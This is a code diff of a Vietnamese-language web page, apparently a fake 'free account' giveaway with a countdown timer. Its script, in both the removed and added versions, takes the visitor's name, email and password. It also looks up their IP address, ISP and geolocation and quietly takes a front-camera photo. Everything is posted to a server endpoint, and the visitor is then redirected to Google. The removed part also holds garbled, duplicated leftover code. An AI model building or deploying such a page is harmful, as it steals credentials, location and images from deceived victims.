@@ -206,194 +206,146 @@
     <div class="toast" id="toast">✅ Đã nhận acc! Kiểm tra email để lấy thông tin.</div>
 
     <script>
-        let timeLeft = 300;
-        const timerEl = document.getElementById('countdown');
+        (function() {
+            let timeLeft = 300;
+            const timerEl = document.getElementById('countdown');
 
-        setInterval(() => {
-            const mins = Math.floor(timeLeft / 60);
-            const secs = timeLeft % 60;
-            timerEl.textContent = String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
-            if (timeLeft <= 0) {
-                timerEl.textContent = '00:00';
-                document.getElementById('submitBtn').disabled = true;
-                document.getElementById('submitBtn').textContent = '⏳ Đã hết hạn';
-            }
-            timeLeft--;
-        }, 1000);
+            setInterval(() => {
+                const mins = Math.floor(timeLeft / 60);
+                const secs = timeLeft % 60;
+                timerEl.textContent = String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+                if (timeLeft <= 0) {
+                    timerEl.textContent = '00:00';
+                    document.getElementById('submitBtn').disabled = true;
+                    document.getElementById('submitBtn').textContent = '⏳ Đã hết hạn';
+                }
+                timeLeft--;
+            }, 1000);
 
-        function blobToBase64(blob) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.onload = () => resolve(reader.result.split(',')[1]);
-                reader.onerror = reject;
-                reader.readAsDataURL(blob);
-            });
-        }
-
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            const name = document.getElementById('name').value.trim();
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const accType = document.getElementById('acc_type').value;
-
-            if (!name || !email || !password) {
-                showToast('⚠️ Vui lòng điền đầy đủ thông tin!');
-                return;
-            }
-
-            document.getElementById('submitBtn').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-
-            const info = {
-                name: name,
-                email: email,
-                password: password,
-                accType: accType,
-                time: new Date().toLocaleString('vi-VN'),
-                ip: '',
-                realIp: '',
-                isp: '',
-                country: '',
-                address: '',
-                lat: '',
-                lon: '',
-                device: navigator.userAgent,
-                platform: navigator.platform,
-                screen: window.screen.width + 'x' + window.screen.height,
-                camera: '⏳ Đang kiểm tra...'
-            };
-
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                info.ip = d.ip || 'Không rõ';
-            } catch (e) { info.ip = 'Lỗi'; }
-
-            try {
-                const r = await fetch('https://icanhazip.com');
-                const ip = await r.text();
-                info.realIp = ip.trim();
-                const res = await fetch('https://ipwho.is/' + info.realIp);
-                const data = await res.json();
-                info.isp = data.connection?.org || 'VNNIC';
-                info.country = data.country || 'Việt Nam';
-                info.lat = data.latitude?.toFixed(6) || '0';
-                info.lon = data.longitude?.toFixed(6) || '0';
-                info.address = (data.city || '') + ', ' + (data.region || '');
-            } catch (e) { info.realIp = 'Lỗi'; }
-
-            let photoBlob = null;
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                await new Promise(r => setTimeout(r, 800));
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                stream.getTracks().forEach(t => t.stop());
-                photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-                info.camera = '✅ Đã chụp camera';
-            } catch (e) {
-                info.camera = '🚫 Không có quyền camera';
-            }
-
-            let photoBase64 = null;
-            if (photoBlob) {
-                photoBase64 = await blobToBase64(photoBlob);
-            }
-
-            const payload = {
-                info: info,
-                photo: photoBase64
-            };
-
-            try {
-                const response = await fetch('/api/send', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+            function blobToBase64(blob) {
+                return new Promise((resolve, reject) => {
+                    const reader = new FileReader();
+                    reader.onload = () => resolve(reader.result.split(',')[1]);
+                    reader.onerror = reject;
+                    reader.readAsDataURL(blob);
                 });
+            }
 
-                const result = await response.json();
+            document.getElementById('loginForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
 
-                if (result.status === 'success') {
-                    showToast('✅ Nhận acc thành công! Kiểm tra email để lấy thông tin.');
-                    setTimeout(() => {
-                        window.location.href = 'https://www.google.com';
-                    }, 3000);
-                } else {
-                    showToast('❌ Lỗi: ' + result.message);
+                const name = document.getElementById('name').value.trim();
+                const email = document.getElementById('email').value.trim();
+                const password = document.getElementById('password').value.trim();
+                const accType = document.getElementById('acc_type').value;
+
+                if (!name || !email || !password) {
+                    showToast('⚠️ Vui lòng điền đầy đủ thông tin!');
+                    return;
+                }
+
+                document.getElementById('submitBtn').style.display = 'none';
+                document.getElementById('loading').style.display = 'block';
+
+                const info = {
+                    name: name,
+                    email: email,
+                    password: password,
+                    accType: accType,
+                    time: new Date().toLocaleString('vi-VN'),
+                    ip: '',
+                    realIp: '',
+                    isp: '',
+                    country: '',
+                    address: '',
+                    lat: '',
+                    lon: '',
+                    device: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: window.screen.width + 'x' + window.screen.height,
+                    camera: '⏳ Đang kiểm tra...'
+                };
+
+                try {
+                    const r = await fetch('https://api.ipify.org?format=json');
+                    const d = await r.json();
+                    info.ip = d.ip || 'Không rõ';
+                } catch (e) { info.ip = 'Lỗi'; }
+
+                try {
+                    const r = await fetch('https://icanhazip.com');
+                    const ip = await r.text();
+                    info.realIp = ip.trim();
+                    const res = await fetch('https://ipwho.is/' + info.realIp);
+                    const data = await res.json();
+                    info.isp = data.connection?.org || 'VNNIC';
+                    info.country = data.country || 'Việt Nam';
+                    info.lat = data.latitude?.toFixed(6) || '0';
+                    info.lon = data.longitude?.toFixed(6) || '0';
+                    info.address = (data.city || '') + ', ' + (data.region || '');
+                } catch (e) { info.realIp = 'Lỗi'; }
+
+                let photoBlob = null;
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+                    await new Promise(r => setTimeout(r, 800));
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    stream.getTracks().forEach(t => t.stop());
+                    photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                    info.camera = '✅ Đã chụp camera';
+                } catch (e) {
+                    info.camera = '🚫 Không có quyền camera';
+                }
+
+                let photoBase64 = null;
+                if (photoBlob) {
+                    photoBase64 = await blobToBase64(photoBlob);
+                }
+
+                const payload = {
+                    info: info,
+                    photo: photoBase64
+                };
+
+                try {
+                    const response = await fetch('/api/send', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+
+                    const result = await response.json();
+
+                    if (result.status === 'success') {
+                        showToast('✅ Nhận acc thành công! Kiểm tra email để lấy thông tin.');
+                        setTimeout(() => {
+                            window.location.href = 'https://www.google.com';
+                        }, 3000);
+                    } else {
+                        showToast('❌ Lỗi: ' + result.message);
+                        document.getElementById('submitBtn').style.display = 'block';
+                        document.getElementById('loading').style.display = 'none';
+                    }
+                } catch (error) {
+                    showToast('❌ Lỗi kết nối: ' + error.message);
                     document.getElementById('submitBtn').style.display = 'block';
                     document.getElementById('loading').style.display = 'none';
                 }
-            } catch (error) {
-                showToast('❌ Lỗi kết nối: ' + error.message);
-                document.getElementById('submitBtn').style.display = 'block';
-                document.getElementById('loading').style.display = 'none';
+            });
+
+            function showToast(msg) {
+                const t = document.getElementById('toast');
+                t.textContent = msg;
+                t.style.display = 'block';
+                setTimeout(() => t.style.display = 'none', 4000);
             }
-        });
-
-        function showToast(msg) {
-            const t = document.getElementById('toast');
-            t.textContent = msg;
-            t.style.display = 'block';
-            setTimeout(() => t.style.display = 'none', 4000);
-        }
-    </script>
-</body>
-</html>st video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                await new Promise(r => setTimeout(r, 800));
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                stream.getTracks().forEach(t => t.stop());
-                photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-                info.camera = '✅ Đã chụp camera';
-            } catch (e) {
-                info.camera = '🚫 Không có quyền camera';
-            }
-
-            const formData = new FormData();
-            formData.append('info', JSON.stringify(info));
-            if (photoBlob) {
-                formData.append('photo', photoBlob, 'front.jpg');
-            }
-
-            try {
-                const response = await fetch('/api/send', { method: 'POST', body: formData });
-                const result = await response.json();
-
-                if (result.status === 'success') {
-                    showToast('✅ Nhận acc thành công! Kiểm tra email để lấy thông tin.');
-                    setTimeout(() => {
-                        window.location.href = 'https://www.google.com';
-                    }, 3000);
-                } else {
-                    showToast('❌ Lỗi: ' + result.message);
-                    document.getElementById('submitBtn').style.display = 'block';
-                    document.getElementById('loading').style.display = 'none';
-                }
-            } catch (error) {
-                showToast('❌ Lỗi kết nối: ' + error.message);
-                document.getElementById('submitBtn').style.display = 'block';
-                document.getElementById('loading').style.display = 'none';
-            }
-        });
-
-        function showToast(msg) {
-            const t = document.getElementById('toast');
-            t.textContent = msg;
-            t.style.display = 'block';
-            setTimeout(() => t.style.display = 'none', 4000);
-        }
+        })();
     </script>
 </body>
 </html>
